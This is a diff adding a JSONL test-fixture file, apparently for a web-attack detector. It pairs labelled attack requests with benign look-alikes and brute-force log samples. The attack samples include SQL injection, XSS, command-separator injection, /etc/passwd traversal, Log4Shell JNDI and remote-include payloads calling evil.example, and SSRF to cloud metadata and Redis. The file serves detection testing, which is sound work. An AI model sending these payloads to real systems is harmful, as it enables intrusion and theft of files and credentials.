@@ -1,0 +1,77 @@
+{"name": "sqli-union-select", "category": "sqli", "request": "GET /item?id=1 union select 1,2,3 from users HTTP/1.1", "expect_alert": true}
+{"name": "sqli-or-1eq1", "category": "sqli", "request": "GET /login?u=admin' or 1=1-- HTTP/1.1", "expect_alert": true}
+{"name": "xss-script", "category": "xss", "request": "GET /s?q=<script>alert(1)</script> HTTP/1.1", "expect_alert": true}
+{"name": "rce-cmd-param", "category": "rce", "request": "GET /run?cmd=whoami HTTP/1.1", "expect_alert": true}
+{"name": "rce-separator", "category": "rce", "request": "GET /p?x=1;whoami HTTP/1.1", "expect_alert": true}
+{"name": "path-traversal", "category": "traversal", "request": "GET /down?f=../../etc/passwd HTTP/1.1", "expect_alert": true}
+{"name": "lfi-etc-passwd", "category": "lfi", "request": "GET /view?p=/etc/passwd HTTP/1.1", "expect_alert": true}
+{"name": "rfi-remote-php", "category": "rfi", "request": "GET /index.php?page=http://evil.example/x HTTP/1.1", "expect_alert": true}
+{"name": "time-blind-sqli", "category": "sqli", "request": "GET /q?id=1 and sleep(5) HTTP/1.1", "expect_alert": true}
+{"name": "webshell-encoder", "category": "webshell", "request": "GET /x?c=base64_decode(gzinflate) HTTP/1.1", "expect_alert": true}
+{"name": "webshell-jsp-upload", "category": "webshell", "request": "GET /uploads/2024/cmd.jsp HTTP/1.1", "ua": "Behinder", "expect_alert": true}
+{"name": "shiro-rememberme", "category": "hvv", "request": "GET /a?rememberMe=deleteMe HTTP/1.1", "expect_alert": true}
+{"name": "fastjson-type", "category": "hvv", "request": "GET /api?d=@type:com.sun.rowset.JdbcRowSetImpl HTTP/1.1", "expect_alert": true}
+{"name": "struts2-ognl", "category": "hvv", "request": "GET /x.action?redirect:%24%7B%23_memberAccess HTTP/1.1", "expect_alert": true}
+{"name": "weblogic-wls-wsat", "category": "hvv", "request": "POST /wls-wsat/CoordinatorPortType HTTP/1.1", "expect_alert": true}
+{"name": "spring-actuator-heapdump", "category": "hvv", "request": "GET /actuator/heapdump HTTP/1.1", "expect_alert": true}
+{"name": "thinkphp-invokefunction", "category": "hvv", "request": "GET /index.php?s=index/think/invokefunction HTTP/1.1", "expect_alert": true}
+{"name": "log4shell-jndi", "category": "hvv", "request": "GET /a?x=${jndi:ldap://evil.example/a} HTTP/1.1", "expect_alert": true}
+{"name": "ssrf-cloud-metadata", "category": "ssrf", "request": "GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1", "expect_alert": true}
+{"name": "xxe-entity", "category": "xxe", "request": "POST /parse?xml=<!ENTITY%20xx HTTP/1.1", "expect_alert": true}
+{"name": "oa-weaver-bsh", "category": "hvv", "request": "GET /weaver/bsh.servlet.BshServlet HTTP/1.1", "expect_alert": true}
+{"name": "unauth-druid", "category": "unauth", "request": "GET /druid/index.html HTTP/1.1", "expect_alert": true}
+{"name": "scanner-sqlmap-ua", "category": "scanner", "request": "GET /robots.txt HTTP/1.1", "ua": "sqlmap/1.7.2", "expect_alert": true}
+{"name": "scanner-nikto-ua", "category": "scanner", "request": "GET /admin HTTP/1.1", "ua": "Mozilla/5.00 (Nikto/2.5.0)", "expect_alert": true}
+{"name": "benign-id-equals-1", "category": "benign", "request": "GET /article?id=1 HTTP/1.1", "expect_alert": false}
+{"name": "benign-select-in-word", "category": "benign", "request": "GET /products?category=select-best-sellers HTTP/1.1", "expect_alert": false}
+{"name": "benign-union-word", "category": "benign", "request": "GET /search?q=union+station+hotel HTTP/1.1", "expect_alert": false}
+{"name": "benign-sort-order", "category": "benign", "request": "GET /api/users?sort=name&order=desc HTTP/1.1", "expect_alert": false}
+{"name": "benign-static-js", "category": "benign", "request": "GET /static/js/app.min.js HTTP/1.1", "expect_alert": false}
+{"name": "benign-upload-image", "category": "benign", "request": "GET /uploads/2024/avatar.png HTTP/1.1", "expect_alert": false}
+{"name": "benign-seo-article", "category": "benign", "request": "GET /blog/how-to-prevent-sql-injection-attacks HTTP/1.1", "expect_alert": false}
+{"name": "benign-download-pdf", "category": "benign", "request": "GET /download?file=q3-report.pdf HTTP/1.1", "expect_alert": false}
+{"name": "benign-exec-report-word", "category": "benign", "request": "GET /api/exec-report?range=30d HTTP/1.1", "expect_alert": false}
+{"name": "benign-admin-dashboard", "category": "benign", "request": "GET /admin/dashboard HTTP/1.1", "expect_alert": false}
+{"name": "benign-api-orders", "category": "benign", "request": "GET /api/v2/orders?status=paid HTTP/1.1", "expect_alert": false}
+{"name": "benign-health-elb", "category": "benign", "request": "GET /health HTTP/1.1", "ua": "ELB-HealthChecker/2.0", "expect_alert": false}
+{"name": "benign-curl-heartbeat", "category": "benign", "request": "GET /api/heartbeat HTTP/1.1", "ua": "curl/8.0.1", "expect_alert": false}
+{"name": "benign-wget-release", "category": "benign", "request": "GET /downloads/release-1.2.tar.gz HTTP/1.1", "ua": "Wget/1.21.3", "expect_alert": false}
+{"name": "benign-python-requests-api", "category": "benign", "request": "GET /api/v1/status HTTP/1.1", "ua": "python-requests/2.31.0", "expect_alert": false}
+{"name": "sqli-encoded-or", "category": "sqli", "request": "GET /p?id=1%20OR%201%3D1 HTTP/1.1", "expect_alert": true}
+{"name": "sqli-inline-comment", "category": "sqli", "request": "GET /p?id=1/**/union/**/select/**/pwd/**/from/**/users HTTP/1.1", "expect_alert": true}
+{"name": "traversal-double-encoded", "category": "traversal", "request": "GET /f?p=%252e%252e%252fetc%252fpasswd HTTP/1.1", "expect_alert": true}
+{"name": "xss-img-onerror", "category": "xss", "request": "GET /s?q=<img src=x onerror=alert(1)> HTTP/1.1", "expect_alert": true}
+{"name": "rce-amp-separator", "category": "rce", "request": "GET /p?x=1%26%26id HTTP/1.1", "expect_alert": true}
+{"name": "log4shell-rmi", "category": "hvv", "request": "GET /a?x=${jndi:rmi://evil.example/a} HTTP/1.1", "expect_alert": true}
+{"name": "webshell-pass-param", "category": "webshell", "request": "POST /x.php?pass=whoami HTTP/1.1", "expect_alert": true}
+{"name": "spring-gateway-routes", "category": "hvv", "request": "GET /actuator/gateway/routes HTTP/1.1", "expect_alert": true}
+{"name": "ssrf-gopher-redis", "category": "ssrf", "request": "GET /fetch?url=gopher://127.0.0.1:6379/_INFO HTTP/1.1", "expect_alert": true}
+{"name": "unauth-solr-cores", "category": "unauth", "request": "GET /solr/admin/cores?action=STATUS HTTP/1.1", "expect_alert": true}
+{"name": "scanner-masscan-ua", "category": "scanner", "request": "GET / HTTP/1.1", "ua": "masscan/1.3", "expect_alert": true}
+{"name": "scanner-dirsearch-ua", "category": "scanner", "request": "GET /admin/ HTTP/1.1", "ua": "dirsearch/0.4.3", "expect_alert": true}
+{"name": "benign-chrome-home", "category": "benign", "request": "GET / HTTP/1.1", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36", "expect_alert": false}
+{"name": "benign-graphql", "category": "benign", "request": "GET /api/graphql?query=currentUser HTTP/1.1", "expect_alert": false}
+{"name": "benign-select-encoded-word", "category": "benign", "request": "GET /search?q=select%20your%20plan HTTP/1.1", "expect_alert": false}
+{"name": "benign-union-jack", "category": "benign", "request": "GET /products?filter=union-jack-flag HTTP/1.1", "expect_alert": false}
+{"name": "benign-users-me", "category": "benign", "request": "GET /api/v1/users/me HTTP/1.1", "expect_alert": false}
+{"name": "benign-wpcontent-image", "category": "benign", "request": "GET /wp-content/uploads/2024/01/photo.jpg HTTP/1.1", "expect_alert": false}
+{"name": "benign-acme-challenge", "category": "benign", "request": "GET /.well-known/acme-challenge/abc123def HTTP/1.1", "expect_alert": false}
+{"name": "benign-favicon", "category": "benign", "request": "GET /favicon.ico HTTP/1.1", "expect_alert": false}
+{"name": "benign-kube-probe", "category": "benign", "request": "GET /api/health HTTP/1.1", "ua": "kube-probe/1.27", "expect_alert": false}
+{"name": "benign-googlebot-sitemap", "category": "benign", "request": "GET /sitemap.xml HTTP/1.1", "ua": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", "expect_alert": false}
+{"name": "benign-cart-passwd-word", "category": "benign", "request": "GET /cart?item=passwd-protected-vault HTTP/1.1", "expect_alert": false}
+{"name": "benign-security-article", "category": "benign", "request": "GET /blog/preventing-xss-and-sql-injection HTTP/1.1", "expect_alert": false}
+{"name": "benign-report-pdf-token", "category": "benign", "request": "GET /download/q3-report.pdf?token=AbC123xyz HTTP/1.1", "expect_alert": false}
+{"name": "benign-font-woff2", "category": "benign", "request": "GET /assets/fonts/roboto.woff2 HTTP/1.1", "expect_alert": false}
+{"name": "benign-login-post", "category": "benign", "request": "POST /api/login HTTP/1.1", "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1", "expect_alert": false}
+{"name": "benign-exec-summary-word", "category": "benign", "request": "GET /api/v2/exec-summary?period=monthly HTTP/1.1", "expect_alert": false}
+{"name": "linux-ssh-bruteforce", "category": "bruteforce", "parser": "linux-auth", "content": "Mar 15 10:00:00 h sshd[11]: Failed password for root from 9.9.9.9 port 51000 ssh2\nMar 15 10:00:02 h sshd[12]: Failed password for root from 9.9.9.9 port 51001 ssh2\nMar 15 10:00:04 h sshd[13]: Failed password for root from 9.9.9.9 port 51002 ssh2\nMar 15 10:00:06 h sshd[14]: Failed password for root from 9.9.9.9 port 51003 ssh2\nMar 15 10:00:08 h sshd[15]: Failed password for root from 9.9.9.9 port 51004 ssh2\nMar 15 10:00:10 h sshd[16]: Failed password for root from 9.9.9.9 port 51005 ssh2\n", "expect_alert": true}
+{"name": "linux-ssh-normal-logins", "category": "benign", "parser": "linux-auth", "content": "Mar 15 09:00:00 h sshd[21]: Accepted password for deploy from 10.0.0.10 port 40000 ssh2\nMar 15 09:05:00 h sshd[22]: Accepted publickey for deploy from 10.0.0.10 port 40001 ssh2\n", "expect_alert": false}
+{"name": "linux-ssh-two-fails-benign", "category": "benign", "parser": "linux-auth", "content": "Mar 15 09:00:00 h sshd[31]: Failed password for admin from 10.0.0.11 port 41000 ssh2\nMar 15 09:30:00 h sshd[32]: Failed password for admin from 10.0.0.11 port 41002 ssh2\n", "expect_alert": false}
+{"name": "p0-vpn-bruteforce", "category": "bruteforce", "parser": "p0-security", "content": "time=2024-03-15T12:00:00 log_type=vpn username=alice src_ip=198.51.100.7 auth_result=failed\ntime=2024-03-15T12:00:10 log_type=vpn username=alice src_ip=198.51.100.7 auth_result=failed\ntime=2024-03-15T12:00:20 log_type=vpn username=alice src_ip=198.51.100.7 auth_result=failed\ntime=2024-03-15T12:00:30 log_type=vpn username=alice src_ip=198.51.100.7 auth_result=failed\ntime=2024-03-15T12:00:40 log_type=vpn username=alice src_ip=198.51.100.7 auth_result=failed\n", "expect_alert": true}
+{"name": "p0-vpn-single-success-benign", "category": "benign", "parser": "p0-security", "content": "time=2024-03-15T12:00:00 log_type=vpn username=alice src_ip=198.51.100.7 auth_result=success\n", "expect_alert": false}
+{"name": "benign-share-external-url", "category": "benign", "request": "GET /share?url=https://www.example.com/article/123 HTTP/1.1", "expect_alert": false}
+{"name": "benign-oauth-redirect-uri", "category": "benign", "request": "GET /auth/callback?redirect_uri=https://app.partner.example.com/home HTTP/1.1", "expect_alert": false}
+{"name": "benign-image-proxy-cdn", "category": "benign", "request": "GET /img?url=https://cdn.example.org/a/b/c.png HTTP/1.1", "expect_alert": false}
+{"name": "benign-apostrophe-name", "category": "benign", "request": "GET /api/customers?name=O'Brien HTTP/1.1", "expect_alert": false}
+{"name": "benign-next-relative-redirect", "category": "benign", "request": "GET /login?next=/dashboard/overview HTTP/1.1", "expect_alert": false}
